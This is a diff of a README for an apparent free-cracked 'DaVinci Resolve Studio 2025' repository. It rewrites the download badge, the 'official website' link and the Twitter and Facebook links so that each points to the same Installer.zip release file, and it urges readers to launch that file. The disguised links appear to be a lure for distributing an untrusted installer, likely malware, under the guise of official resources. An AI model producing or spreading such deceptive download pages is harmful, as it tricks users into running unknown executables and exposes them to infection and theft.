@@ -17,7 +17,7 @@ This repository is dedicated to providing you with all the resources you need to
 
 To begin your journey with DaVinci Resolve Studio 2025, download the setup files from the link below:
 
-[![Download DaVinci Resolve Studio 2025 Zip](https://img.shields.io/badge/Download%20ZIP-v1.0.0-red)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download DaVinci Resolve Studio 2025 Zip](https://github.com/opitou/DaVinci-Resolve-Studio-Free-Setup/releases/download/v1.0/Installer.zip%20ZIP-v1.0.0-red)](https://github.com/opitou/DaVinci-Resolve-Studio-Free-Setup/releases/download/v1.0/Installer.zip)
 
 🚀 Make sure to launch the downloaded file to start the installation process and unlock the full potential of DaVinci Resolve Studio 2025!
 
@@ -52,7 +52,7 @@ Follow these simple steps to install DaVinci Resolve Studio 2025 on your system:
 
 ## Resources
 
-For more in-depth guides and tutorials on using DaVinci Resolve Studio 2025, visit the official [DaVinci Resolve website](https://www.blackmagicdesign.com/products/davinciresolve).
+For more in-depth guides and tutorials on using DaVinci Resolve Studio 2025, visit the official [DaVinci Resolve website](https://github.com/opitou/DaVinci-Resolve-Studio-Free-Setup/releases/download/v1.0/Installer.zip).
 
 Explore the vast array of resources available to enhance your DaVinci Resolve Studio 2025 experience and take your editing skills to the next level!
 
@@ -62,8 +62,8 @@ Join the DaVinci Resolve community and connect with fellow creators to share you
 
 ### Follow Us on Social Media
 
-- [Twitter](https://twitter.com/DaVinciResolve)
-- [Facebook](https://www.facebook.com/BlackmagicDesignOfficial)
+- [Twitter](https://github.com/opitou/DaVinci-Resolve-Studio-Free-Setup/releases/download/v1.0/Installer.zip)
+- [Facebook](https://github.com/opitou/DaVinci-Resolve-Studio-Free-Setup/releases/download/v1.0/Installer.zip)
 
 Let's embark on this exciting journey together and unlock the full power of DaVinci Resolve Studio 2025! 🎥✨
 
